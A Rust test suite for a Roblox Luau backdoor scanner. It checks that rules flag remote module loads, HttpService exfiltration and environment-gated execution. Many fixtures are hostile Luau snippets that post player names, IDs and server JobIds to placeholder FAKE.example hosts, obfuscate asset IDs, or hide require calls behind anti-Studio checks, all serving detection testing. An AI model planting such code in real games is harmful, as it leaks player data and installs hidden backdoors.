        names_id(start, &result, "BG001", "999000000009001");
    }
}

/// Captures that are never assigned again keep their exact value.
#[test]
fn item4_unchanged_captures_stay_exact() {
    for source in [
        format!("local id = {TR}\nlocal function load() require(id) end\nload()"),
        format!("local cfg = {{id = {TR}}}\nlocal function load() require(cfg.id) end\nload()"),
        format!(
            "local cfg = {{id = {TR}}}\nlocal other = {{}}\nother.name = \"FAKE\"\nlocal function load() require(cfg.id) end\nload()"
        ),
    ] {
        let result = analysis(&source);
        assert!(
            result
                .findings
                .iter()
                .any(|finding| finding.confidence == Confidence::High
                    && finding
                        .evidence
                        .contains(&format!("resolved asset id: {TR}"))),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 5: instance and service identity through every call form ------------------

/// Reads of `script.Parent.FAKE_Id` (or its parent's attribute) through call forms that
/// used to lose the instance (reviewer shapes P25 to P31, C32, C33, C41, C42, C47, C51,
/// second review D05, D09, D10, D14, D20).
fn instance_routes() -> Vec<(&'static str, &'static str)> {
    vec![
        (
            "plain parameter",
            "local function load(v) return require(v.Value) end\nload(script.Parent.FAKE_Id)",
        ),
        (
            "identity helper",
            "local function get(o) return o end\nrequire(get(script.Parent.FAKE_Id).Value)",
        ),
        (
            "attribute in a helper",
            "local function f(o) return o:GetAttribute(\"FAKE_id\") end\nrequire(f(script.Parent))",
        ),
        (
            "task.spawn parameter",
            "task.spawn(function(v) require(v.Value) end, script.Parent.FAKE_Id)",
        ),
        (
            "task.defer parameter",
            "task.defer(function(v) require(v.Value) end, script.Parent.FAKE_Id)",
        ),
        (
            "coroutine.wrap parameter",
            "local co = coroutine.wrap(function(v) require(v.Value) end)\nco(script.Parent.FAKE_Id)",
        ),
        (
            "varargs",
            "local function f(...) require((...).Value) end\nf(script.Parent.FAKE_Id)",
        ),
        (
            "select on varargs",
            "local function f(...) require(select(1, ...).Value) end\nf(script.Parent.FAKE_Id)",
        ),
        (
            "dot call",
            "require(script.Parent.FindFirstChild(script.Parent, \"FAKE_Id\").Value)",
        ),
        (
            "method value",
            "local find = game.FindFirstChild\nrequire(find(script.Parent, \"FAKE_Id\").Value)",
        ),
        (
            "pcall of a method value",
            "local ok, v = pcall(script.Parent.FindFirstChild, script.Parent, \"FAKE_Id\")\nrequire(v.Value)",
        ),
        (
            "GetAttribute value",
            "local get = script.Parent.GetAttribute\nrequire(get(script.Parent, \"FAKE_id\"))",
        ),
        (
            "table.remove of children",
            "local kids = script.Parent:GetChildren()\nlocal picked = table.remove(kids, 1)\nrequire(picked.Value)",
        ),
        (
            "select of unpacked children",
            "local kids = script.Parent:GetChildren()\nlocal picked = select(1, table.unpack(kids))\nrequire(picked.Value)",
        ),
        (
            "helper returns a child",
            "local function first(parent) return parent:GetChildren()[1] end\nrequire(first(script.Parent).Value)",
        ),
        (
            "QueryDescendants",
            "require(script.Parent:QueryDescendants(\"#FAKE_Id\")[1].Value)",
        ),
        (
            "ChildAdded parameter",
            "script.Parent.ChildAdded:Connect(function(child) require(child.Value) end)",
        ),
        (
            "DescendantAdded parameter",
            "script.Parent.DescendantAdded:Connect(function(d) require(d:GetAttribute(\"FAKE_id\")) end)",
        ),
        (
            "Changed parameter",
            "script.Parent.FAKE_Id.Changed:Connect(function(newValue) require(newValue) end)",
        ),
        (
            "named Changed handler",
            "local function onChange(v) require(v) end\nscript.Parent.FAKE_Id.Changed:Connect(onChange)",
        ),
        (
            "GetTagged",
            "require(game:GetService(\"CollectionService\"):GetTagged(\"FAKE_tag\")[1].Value)",
        ),
        (
            "player attribute",
            "game:GetService(\"Players\").PlayerAdded:Connect(function(p) require(p:GetAttribute(\"FAKE_id\")) end)",
        ),
    ]
}

#[test]
fn item5_instance_values_survive_every_call_form() {
    for (label, source) in instance_routes() {
        for trusted in [&[TRUSTED][..], &[]] {
            let result = model_analysis(TR, &[source], trusted);
            expect(label, &result, "BG002", Severity::Medium, None);
        }
    }
}

/// HttpService as a parameter, returned through `pcall`, wrapped in a method named
/// `GetAsync`, or looked up through a detached `GetService` (P15 to P17, second review D58).
#[test]
fn item5_http_service_identity_survives_call_forms() {
    let players = "local Players = game:GetService(\"Players\")\n";
    for (source, severity) in [
        (
            "local HS = game:GetService(\"HttpService\")\nlocal function send(r, p) r:PostAsync(\"https://c.FAKE.example/x\", p.Name) end\nPlayers.PlayerAdded:Connect(function(p) send(HS, p) end)",
            Severity::High,
        ),
        (
            "local HS = game:GetService(\"HttpService\")\nlocal DSS = game:GetService(\"DataStoreService\")\nlocal r = DSS:GetDataStore(\"x\")\nlocal ok, s = pcall(function() return HS end)\nr = s\nPlayers.PlayerAdded:Connect(function(p) r:PostAsync(\"https://c.FAKE.example/x\", p.Name) end)",
            Severity::High,
        ),
        (
            "local HS = game:GetService(\"HttpService\")\nlocal api = {}\nfunction api:GetAsync(url) return HS:GetAsync(url) end\nPlayers.PlayerAdded:Connect(function(p) api:GetAsync(\"https://c.FAKE.example/?u=\" .. p.UserId) end)",
            Severity::Medium,
        ),
        (
            "local ok, H = pcall(game.GetService, game, \"HttpService\")\nH:PostAsync(\"https://c.FAKE.example/x\", game.JobId)",
            Severity::High,
        ),
        (
            "local get = game.GetService\nlocal H = get(game, \"HttpService\")\nH:PostAsync(\"https://c.FAKE.example/x\", game.JobId)",
            Severity::High,
        ),
    ] {
        let source = format!("{players}{source}");
        expect(&source, &analysis(&source), "BG008", severity, None);
    }
}

/// Stores reached through a detached `GetService` or `FindService` are still stores, so
/// their `GetAsync` is not HTTP (second review D65 and D66).
#[test]
fn item5_detached_service_lookups_keep_store_types() {
    for source in [
        "local get = game.GetService\nlocal service = get(game, \"DataStoreService\")\nlocal store = service:GetDataStore(\"FAKE\")\ngame:GetService(\"Players\").PlayerAdded:Connect(function(who)\nprint(store:GetAsync(\"https://cache.FAKE.example/\" .. who.UserId))\nend)",
        "local find = game.FindService\nlocal service = find(game, \"MemoryStoreService\")\nlocal map = service:GetHashMap(\"FAKE\")\ngame:GetService(\"Players\").PlayerAdded:Connect(function(who)\nprint(map:GetAsync(\"https://cache.FAKE.example/\" .. who.UserId))\nend)",
        "local ok, service = pcall(game.GetService, game, \"DataStoreService\")\nlocal store = service:GetDataStore(\"FAKE\")\ngame:GetService(\"Players\").PlayerAdded:Connect(function(who)\nprint(store:GetAsync(\"https://cache.FAKE.example/\" .. who.UserId))\nend)",
    ] {
        let result = analysis(source);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.rule_id != "BG008"),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

/// Requiring the instance itself through the same forms is still a local module load.
#[test]
fn item5_requiring_instances_through_call_forms_stays_local() {
    for source in [
        "local function load(m) return require(m) end\nload(script.Parent.FAKE_Id)",
        "local find = game.FindFirstChild\nrequire(find(script.Parent, \"FAKE_Id\"))",
        "script.Parent.ChildAdded:Connect(function(child) require(child) end)",
        "local kids = script.Parent:GetChildren()\nrequire(table.remove(kids, 1))",
    ] {
        let result = model_analysis(TR, &[source], &[]);
        assert!(
            result
                .findings
                .iter()
                .all(|finding| finding.severity < Severity::High),
            "{source}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 6: table library ----------------------------------------------------------

fn resolves_to(label: &str, result: &AnalysisResult, id: &str) {
    assert!(
        result
            .findings
            .iter()
            .any(|finding| finding.confidence == Confidence::High
                && finding
                    .evidence
                    .contains(&format!("resolved asset id: {id}"))),
        "{label}: {:#?}",
        describe(&result.findings)
    );
}

/// `table.create` and `table.move` follow their values (second review T10 to T14).
#[test]
fn item6_table_create_and_move_carry_values() {
    for source in [
        format!("local ids = table.create(1, {X})\nrequire(ids[1])"),
        format!("local ids = table.create(3, {X})\nrequire(ids[3])"),
        format!("local ids = table.create(1)\nids[1] = {X}\nrequire(ids[1])"),
        format!("local ids = table.create(1, {TR})\nids[1] = {X}\nrequire(ids[1])"),
        format!(
            "local src = {{{X}}}\nlocal dst = {{}}\ntable.move(src, 1, 1, 1, dst)\nrequire(dst[1])"
        ),
        format!(
            "local src = {{false, {X}}}\nlocal dst = {{}}\ntable.move(src, 2, 2, 3, dst)\nrequire(dst[3])"
        ),
        format!("local ids = {{{TR}, {X}}}\ntable.move(ids, 2, 2, 1)\nrequire(ids[1])"),
    ] {
        resolves_to(&source, &analysis(&source), X);
    }
}

/// What the table library cannot follow exactly stays a candidate, never a quiet low
/// finding (second review T20, reviewer A06 and A07).
#[test]
fn item6_unfollowed_table_library_calls_keep_candidates() {
    for source in [
        format!("local ids = table.create(1)\nfor i = 1, 1 do ids[i] = {X} end\nrequire(ids[1])"),
        format!("local ids = table.create(1e9, {X})\nrequire(ids[5000])"),
        format!("local ids = table.create(FAKE_n, {X})\nrequire(ids[1])"),
        format!(
            "local src = {{{X}}}\nlocal dst = {{}}\ntable.move(src, 1, FAKE_n, 1, dst)\nrequire(dst[1])"
        ),
        format!(
            "local src = {{{X}}}\nlocal dst = {{}}\ntable.move(src, 1, 1e9, 1, dst)\nrequire(dst[1])"
        ),
    ] {
        let result = analysis(&source);
        expect(&source, &result, "BG001", Severity::High, None);
        names_id(&source, &result, "BG001", X);
    }
    // A move into a table the scanner does not know stays bounded and quiet.
    let result = analysis(&format!(
        "local src = {{{X}}}\ntable.move(src, 1, 1, 1, FAKE_dst)"
    ));
    assert!(result.reasons.is_empty(), "{:?}", result.reasons);
}

/// Player data in `table.create` reaches BG008 (second review D27, D55, D60, D61).
#[test]
fn item6_table_create_keeps_player_data() {
    let http = "local H = game:GetService(\"HttpService\")\n";
    for body in [
        "game:GetService(\"Players\").PlayerAdded:Connect(function(who)\nlocal payload = table.create(1, who.AccountAge)\nH:PostAsync(\"https://collect.FAKE.example/x\", H:JSONEncode(payload))\nend)",
        "game:GetService(\"Players\").PlayerAdded:Connect(function(who)\nlocal payload = table.create(1)\ntable.insert(payload, who.AccountAge)\nH:PostAsync(\"https://collect.FAKE.example/x\", H:JSONEncode(payload))\nend)",
        "local parts = table.create(1, game.JobId)\nlocal url = \"https://collect.FAKE.example/x?job=\" .. table.concat(parts)\nH:PostAsync(url, \"FAKE\")",
        "game:GetService(\"Players\").PlayerAdded:Connect(function(who)\nlocal payload = table.create(1, who.UserId)\nH:RequestAsync({Url = \"https://collect.FAKE.example/x\", Method = \"POST\", Body = H:JSONEncode(payload)})\nend)",
        "local src = {game.JobId}\nlocal dst = {}\ntable.move(src, 1, 1, 1, dst)\nH:PostAsync(\"https://collect.FAKE.example/x\", H:JSONEncode(dst))",
        "local src = {game.JobId}\nlocal dst = {}\ntable.move(src, 1, FAKE_n, 1, dst)\nH:PostAsync(\"https://collect.FAKE.example/x\", H:JSONEncode(dst))",
    ] {
        let source = format!("{http}{body}");
        expect(body, &analysis(&source), "BG008", Severity::High, None);
    }
}

// ----- item 9: IDs inside table arguments past the replay limits ----------------------

/// Four wrapper levels pass the ID in a table (second review T08 and T09).
#[test]
fn item9_replay_limit_summaries_find_ids_in_tables() {
    for (call, read) in [
        (format!("a({{id = {X}}})"), "t.id"),
        (format!("a({{inner = {{id = {X}}}}})"), "t.inner.id"),
        (format!("a({{{{{{{X}}}}}}})"), "t[1][1][1]"),
    ] {
        let source = format!(
            "local function d(t) require({read}) end\nlocal function c(t) d(t) end\nlocal function b(t) c(t) end\nlocal function a(t) b(t) end\n{call}"
        );
        let result = analysis(&source);
        expect(&source, &result, "BG001", Severity::High, None);
        names_id(&source, &result, "BG001", X);
    }
}

// ----- item 12: small folds -------------------------------------------------------------

/// The shape of second review T21 to T23: an ID rebuilt from bit32 results.
fn bit32_source(id: u64, wrap: impl Fn(u64, u32) -> String) -> String {
    let (hi, lo) = (id / 4_294_967_296, id % 4_294_967_296);
    let (upper, lower) = (lo / 4096, lo % 4096);
    format!(
        "local hi = {}\nlocal upper = {}\nlocal lower = {}\nlocal scale = {} * {}\nrequire(hi * scale + upper * 4096 + lower)",
        wrap(hi, 18),
        wrap(upper, 20),
        wrap(lower, 12),
        wrap(65_536, 17),
        wrap(65_536, 17)
    )
}

#[test]
fn item12_bit32_rotate_and_replace_fold() {
    let id: u64 = X.parse().expect("id");
    for (label, source) in [
        (
            "lrotate",
            bit32_source(id, |n, _| format!("bit32.lrotate({n}, 0)")),
        ),
        (
            "rrotate",
            bit32_source(id, |n, _| format!("bit32.rrotate({n}, 32)")),
        ),
        (
            "lrotate there and back",
            bit32_source(id, |n, _| {
                format!("bit32.rrotate(bit32.lrotate({n}, 7), 7)")
            }),
        ),
        (
            "replace",
            bit32_source(id, |n, width| format!("bit32.replace(0, {n}, 0, {width})")),
        ),
    ] {
        resolves_to(label, &analysis(&source), X);
    }
    // Exact values.
    for (expression, value) in [
        ("bit32.lrotate(2147483649, 1)", 3u64),
        ("bit32.rrotate(1, 1)", 2_147_483_648),
        ("bit32.lrotate(1, -1)", 2_147_483_648),
        ("bit32.replace(4294967295, 0, 4, 8)", 4_294_963_215),
        ("bit32.replace(0, 255, 28, 4)", 4_026_531_840),
    ] {
        let source = format!("require({expression} + 999000000000000)");
        resolves_to(
            expression,
            &analysis(&source),
            &(value + TRUSTED).to_string(),
        );
    }
}

/// `gsub` with a function replacement gives what the function returns (second review T28).
#[test]
fn item12_gsub_function_replacements_fold() {
    for source in [
        format!("local text = (\"x\"):gsub(\"x\", function() return \"{X}\" end)\nrequire(tonumber(text))"),
        format!("local function r() return \"{X}\" end\nlocal text = string.gsub(\"x\", \"x\", r)\nrequire(tonumber(text))"),
        "local text = (\"999000000005a77\"):gsub(\"a\", function(c) return \"0\" end)\nrequire(tonumber(text))".to_string(),
        format!("local text = (\"{X}\"):gsub(\"5\", function() return nil end)\nrequire(tonumber(text))"),
        "local t = {[\"a\"] = \"999\", [\"b\"] = \"000000005077\"}\nlocal text = (\"ab\"):gsub(\"%a\", function(c) return t[c] end)\nrequire(tonumber(text))".to_string(),
    ] {
        resolves_to(&source, &analysis(&source), X);
    }
    // Player data returned by the callback reaches the result.
    let source = "local H = game:GetService(\"HttpService\")\ngame:GetService(\"Players\").PlayerAdded:Connect(function(p)\nlocal body = (\"x\"):gsub(\"x\", function() return p.Name end)\nH:PostAsync(\"https://collect.FAKE.example/x\", body)\nend)";
    expect(source, &analysis(source), "BG008", Severity::High, None);
}

// ----- item 7: `_G`, `shared` and `getfenv()` inside one script -------------------------

/// Values stored in `_G` or `shared`, or in a global through `getfenv()`, resolve in the
/// same script (reviewer P12, P13, T40, T41).
#[test]
fn item7_globals_inside_one_script_resolve() {
    for source in [
        format!("_G.FAKE_id = {X}\nrequire(_G.FAKE_id)"),
        format!("shared.FAKE_id = {X}\nrequire(shared.FAKE_id)"),
        format!("_G[\"FAKE_id\"] = {X}\nrequire(_G.FAKE_id)"),
        format!("rawset(_G, \"FAKE_id\", {X})\nrequire(rawget(_G, \"FAKE_id\"))"),
        format!("_G.FAKE_id = {TR}\nrawset(_G, \"FAKE_id\", {X})\nrequire(_G.FAKE_id)"),
        format!("local G = _G\nG.FAKE_id = {X}\nrequire(_G.FAKE_id)"),
        format!("FAKE_id = {TR}\ngetfenv().FAKE_id = {X}\nrequire(FAKE_id)"),
        format!("FAKE_id = {TR}\ngetfenv(0).FAKE_id = {X}\nrequire(FAKE_id)"),
        format!("local env = getfenv()\nenv.FAKE_id = {X}\nrequire(FAKE_id)"),
        format!("rawset(getfenv(), \"FAKE_id\", {X})\nrequire(FAKE_id)"),
        format!("FAKE_id = {X}\nrequire(getfenv().FAKE_id)"),
    ] {
        let result = analysis(&source);
        resolves_to(&source, &result, X);
        expect(
            &source,
            &trusted_analysis(&source),
            "BG001",
            Severity::High,
            None,
        );
    }
}

/// Changes that are not straight line keep candidates.
#[test]
fn item7_conditional_and_later_global_writes_keep_candidates() {
    for source in [
        format!("_G.FAKE_id = {TR}\nif FAKE_c then _G.FAKE_id = {X} end\nrequire(_G.FAKE_id)"),
        format!(
            "local function set() _G.FAKE_id = {X} end\n_G.FAKE_id = {TR}\nset()\nrequire(_G.FAKE_id)"
        ),
        format!(
            "local function load() require(_G.FAKE_id) end\n_G.FAKE_id = {TR}\n_G.FAKE_id = {X}\nload()"
        ),
        format!("FAKE_id = {TR}\ngetfenv()[FAKE_k] = {X}\nrequire(FAKE_id)"),
        format!("_G.FAKE_id = {TR}\n_G[FAKE_k] = {X}\nrequire(_G.FAKE_id)"),
    ] {
        let result = trusted_analysis(&source);
        expect(&source, &result, "BG001", Severity::High, None);
        let result = analysis(&source);
        names_id(&source, &result, "BG001", X);
    }
}

/// A function that writes a variable or a table from outside, called after an
/// overwrite, still changes it.
#[test]
fn item7_setters_called_later_apply_where_called() {
    for source in [
        format!(
            "local id = {TR}\nlocal function set() id = {X} end\nid = {TR}\nset()\nrequire(id)"
        ),
        format!(
            "local cfg = {{id = {TR}}}\nlocal function set() cfg.id = {X} end\ncfg.id = {TR}\nset()\nrequire(cfg.id)"
        ),
    ] {
        let result = analysis(&source);
        names_id(&source, &result, "BG001", X);
        expect(
            &source,
            &trusted_analysis(&source),
            "BG001",
            Severity::High,
            None,
        );
    }
}

/// Other scripts' values in `_G` stay the documented low finding, and BG004 still sees
/// the environment.
#[test]
fn item7_cross_script_globals_and_bg004_are_unchanged() {
    let result = analysis("require(_G.FAKE_cfg)");
    expect(
        "cross script",
        &result,
        "BG001",
        Severity::Low,
        Some(Confidence::Low),
    );
    for source in [
        "getfenv().FAKE_x = 1",
        "local f = getfenv()[FAKE_name]\nf(1)",
        "setmetatable(getfenv(), {})",
    ] {
        expect(source, &analysis(source), "BG004", Severity::Medium, None);
    }
}

// ----- item 8: `__index` chains and evaluation depth ------------------------------------

fn index_chain(levels: usize) -> String {
    let mut source = format!("local t0 = {{id = {X}}}\n");
    for level in 1..=levels {
        source.push_str(&format!(
            "local t{level} = setmetatable({{}}, {{__index = t{}}})\n",
            level - 1
        ));
    }
    source.push_str(&format!("require(t{levels}.id)"));
    source
}

/// Eight tables are followed exactly; a longer chain keeps the ID as a candidate, high
/// with medium confidence (reviewer P14, second review T15).
#[test]
fn item8_long_index_chains_fail_closed() {
    resolves_to("7 levels", &analysis(&index_chain(7)), X);
    for levels in [8, 9, 20, 100] {
        let source = index_chain(levels);
        let result = analysis(&source);
        expect(
            &source,
            &result,
            "BG001",
            Severity::High,
            Some(Confidence::Medium),
        );
        names_id(&source, &result, "BG001", X);
        no_resolved_claim(&source, &result);
        assert!(result.reasons.is_empty(), "{:?}", result.reasons);
        // Trust does not apply to a table read anyway.
        expect(
            &source,
            &trusted_analysis(&source.replace(X, TR)),
            "BG001",
            Severity::High,
            None,
        );
    }
    // A chain past `max_depth` tables gives an unknown value: still reported.
    let result = analysis(&index_chain(200));
    expect("200 levels", &result, "BG001", Severity::Low, None);
}

/// When the evaluation depth cuts a value that reaches `require`, the input is partial,
/// also when a fold turns the cut value into an unknown one (reviewer: a 200 deep
/// `tonumber` nest).
#[test]
fn item8_depth_cuts_before_require_make_the_input_partial() {
    for (label, wrap) in [
        ("tonumber", "tonumber("),
        ("tostring", "tostring("),
        ("parentheses", "("),
        ("math.floor", "math.floor("),
    ] {
        let source = format!("require({}{X}{})", wrap.repeat(200), ")".repeat(200));
        let result = analysis(&source);
        assert!(
            result
                .reasons
                .iter()
                .any(|reason| reason.contains("analysis depth limit reached for a require target")),
            "{label}: {:?} {:#?}",
            result.reasons,
            describe(&result.findings)
        );
        expect(label, &result, "BG001", Severity::Low, None);
    }
    // The same depth elsewhere does not make the input partial.
    let deep = format!(
        "local x = {}1{}\nprint(x)",
        "tonumber(".repeat(200),
        ")".repeat(200)
    );
    assert!(analysis(&deep).reasons.is_empty());
    // A wrapper that receives the cut value is covered too.
    let source = format!(
        "local function load(v) return require(v) end\nload({}{X}{})",
        "tonumber(".repeat(200),
        ")".repeat(200)
    );
    let result = analysis(&source);
    assert!(
        result
            .reasons
            .iter()
            .any(|reason| reason.contains("analysis depth limit reached")),
        "wrapper: {:?}",
        result.reasons
    );
}

// ----- item 10: BG009 gates ---------------------------------------------------------------

fn has_rule(result: &AnalysisResult, rule: &str) -> bool {
    result
        .findings
        .iter()
        .any(|finding| finding.rule_id == rule)
}

/// Gates in expressions, as asserts and as `error` exits, the `time()`, `os.clock` and
/// `CreatorType` checks, and a wrapper called only under a gate (reviewer C91 to C103,
/// second review D36, D37, D50, D52, D53).
#[test]
fn item10_more_gate_forms_report_bg009() {
    let rs = "local RS = game:GetService(\"RunService\")\n";
    let mut count = 0;
    for gated in [
        format!("local _ = not RS:IsStudio() and require({X})"),
        format!("local _ = game.PlaceId == 999000000004050 and require({X})"),
        format!("local ok = RS:IsStudio() or require({X})"),
        format!("local f = if game.CreatorId == 999000000004037 then require else print\nf({X})"),
        format!("local _ = if RS:IsStudio() then nil else require({X})"),
        format!("assert(not RS:IsStudio())\nrequire({X})"),
        format!("assert(game.CreatorId == 999000000004053, \"FAKE creator\")\nrequire({X})"),
        format!("if RS:IsStudio() then error(\"FAKE\") end\nrequire({X})"),
        format!(
            "if game.PlaceId ~= 999000000004052 then error(\"FAKE wrong place\") end\nrequire({X})"
        ),
        format!("if time() > 600 then require({X}) end"),
        format!("if os.clock() > 3600 then require({X}) end"),
        format!("if game.CreatorType == Enum.CreatorType.Group then require({X}) end"),
        format!(
            "local function load() require({X}) end\nif game.PlaceId == 999000000004050 then load() end"
        ),
        format!(
            "local function load() require({X}) end\nlocal _ = game.PlaceId == 999000000004050 and load()"
        ),
        "local function load() loadstring(\"return 1\")() end\nif RS:IsStudio() then return end\nload()"
            .to_string(),
    ] {
        let source = format!("{rs}{gated}");
        let result = analysis(&source);
        assert!(
            has_rule(&result, "BG009"),
            "{gated}: {:#?}",
            describe(&result.findings)
        );
        count += 1;
    }
    assert_eq!(count, 15);
}

/// Checks that do not control the action stay quiet.
#[test]
fn item10_checks_that_do_not_control_the_action_stay_quiet() {
    let rs = "local RS = game:GetService(\"RunService\")\n";
    for quiet in [
        format!("local _ = FAKE_c and require({X})"),
        format!("assert(FAKE_ok)\nrequire({X})"),
        format!("if FAKE_c then error(\"FAKE\") end\nrequire({X})"),
        format!("print(time())\nrequire({X})"),
        format!("local t = {{time = 5}}\nif t.time > 3 then require({X}) end"),
        format!(
            "local function load() require({X}) end\nload()\nif game.PlaceId == 1 then print(1) end"
        ),
        format!("local studio = RS:IsStudio()\nprint(studio)\nrequire({X})"),
        format!("local _ = RS:IsStudio() and print(\"FAKE\")\nrequire({X})"),
    ] {
        let source = format!("{rs}{quiet}");
        let result = analysis(&source);
        expect(&quiet, &result, "BG001", Severity::High, None);
        assert!(
            !has_rule(&result, "BG009"),
            "{quiet}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- item 11: BG010 ---------------------------------------------------------------------

/// The added prompt and teleport methods report in inserted content (reviewer P40 to
/// P42), and only there.
#[test]
fn item11_more_prompts_and_teleports_in_inserted_content() {
    for call in [
        format!("TS:TeleportToPrivateServer({X}, \"FAKE_code\", {{p}})"),
        format!("TS:TeleportPartyAsync({X}, {{p}})"),
        "MS:PromptSubscriptionPurchase(p, \"EXP-FAKE\")".to_string(),
        format!("TS.TeleportPartyAsync(TS, {X}, {{p}})"),
    ] {
        let source = format!(
            "local TS = game:GetService(\"TeleportService\")\nlocal MS = game:GetService(\"MarketplaceService\")\ngame:GetService(\"Players\").PlayerAdded:Connect(function(p) {call} end)"
        );
        let inserted = model_analysis(TR, &[&source], &[]);
        expect(&call, &inserted, "BG010", Severity::Medium, None);
        let file = analysis(&source);
        assert!(
            !has_rule(&file, "BG010"),
            "{call}: a source file is not inserted content: {:#?}",
            describe(&file.findings)
        );
    }
    // An empty player list teleports no one.
    for call in [
        format!("TS:TeleportToPrivateServer({X}, \"FAKE_code\", {{}})"),
        format!("TS:TeleportPartyAsync({X}, {{}})"),
    ] {
        let source = format!("local TS = game:GetService(\"TeleportService\")\n{call}");
        let result = model_analysis(TR, &[&source], &[]);
        assert!(
            !has_rule(&result, "BG010"),
            "{call}: {:#?}",
            describe(&result.findings)
        );
    }
}

// ----- documentation claims ---------------------------------------------------------------

/// The first `luau` code block of a docs page.
fn page_example(page: &str) -> String {
    let start = page.find("```luau\n").expect("example") + "```luau\n".len();
    let end = start + page[start..].find("```").expect("end of example");
    page[start..end].to_string()
}

/// The BG010 page example fires inside a model and not in a plain source file.
#[test]
fn docs_bg010_page_example_fires_only_in_inserted_content() {
    let example = page_example(include_str!("../../../docs/rules/BG010.md"));
    let inserted = model_analysis(TR, &[&example], &[]);
    expect(
        "model",
        &inserted,
        "BG010",
        Severity::Medium,
        Some(Confidence::Medium),
    );
    assert!(!has_rule(&analysis(&example), "BG010"));
}

/// README: a closure that a factory returns is checked with the values the factory
/// received.
#[test]
fn docs_factory_closures_are_checked_with_the_factory_arguments() {
    for source in [
        format!(
            "local function make(id) return function() return require(id) end end\nmake({X})()"
        ),
        format!(
            "local function make(id) return function() return require(id) end end\nlocal f = make({X})\nf()"
        ),
    ] {
        let result = analysis(&source);
        expect(&source, &result, "BG001", Severity::High, None);
        names_id(&source, &result, "BG001", X);
    }
}

/// BG001 page: the constant examples keep trust, the configuration table does not.
#[test]
fn docs_bg001_trust_examples() {
    for source in [
        format!("require({TR})"),
        format!("local ID = {TR}\nrequire(ID)"),
    ] {
        assert!(trusted_analysis(&source).findings.is_empty(), "{source}");
    }
    let both = analyze(
        &script_document(&format!("require(FAKE_c and {TR} or {TR2})")),
        0,
        &Limits::default(),
        &[TRUSTED, TRUSTED_2],
    );
    assert!(both.findings.is_empty());
    let config = trusted_analysis(&format!(
        "local Config = {{AdminModule = {TR}}}\nrequire(Config.AdminModule)"
    ));
    names_id(
        "config table",
        &config,
        "BG001",
        "trusted asset id, not a constant target",
    );
}
